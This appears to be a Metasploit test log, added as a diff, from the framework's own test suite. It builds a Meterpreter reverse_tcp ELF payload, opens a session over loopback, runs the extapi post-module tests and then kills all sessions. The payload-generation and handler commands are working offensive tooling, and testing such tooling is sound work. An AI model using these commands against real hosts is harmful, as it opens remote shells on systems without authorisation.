@@ -1,0 +1,36 @@
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+[4mmsf6[0m [0m> use linux/x64/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20231026-3271-9kdwd2txt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231026-3271-tyeocd -f elf AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20231026-3271-7w5f79txt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+SessionTlvLogging => file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20231026-3271-9kdwd2txt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231026-3271-tyeocd...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Sending stage (3045380 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:38460) at 2023-10-26 19:04:13 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[*] Loading extapi extension...
+[*] This module is only available in a windows meterpreter session.
+[*] Running against session 1
+[*] Session type is meterpreter and platform is linux
+[*] SKIPPED: def test_service_management (session platform is not windows)
+[*] SKIPPED: def test_desktop_windows_management (session platform is not windows)
+[*] SKIPPED: def test_clipboard_management (session platform is not windows)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 3; Failed: 0; Skipped: 3
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> 
